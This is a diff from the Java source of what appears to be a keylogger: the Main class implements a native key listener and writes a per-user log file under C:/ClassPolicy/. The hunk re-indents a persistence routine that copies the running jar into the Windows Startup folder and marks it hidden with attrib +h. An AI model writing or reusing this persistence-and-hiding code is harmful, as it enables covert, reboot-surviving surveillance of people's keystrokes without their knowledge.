@@ -59,12 +59,12 @@ public class Main implements NativeKeyListener
 		Chocolat.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
 		if (Radio.doPersistance)
 		{
-		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
-		 @SuppressWarnings("unused")
-		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
-		 @SuppressWarnings("unused")
-		Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
+			File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+			String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+			@SuppressWarnings("unused")
+			Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
+			@SuppressWarnings("unused")
+			Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
 		}
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
 		if(!log.exists())
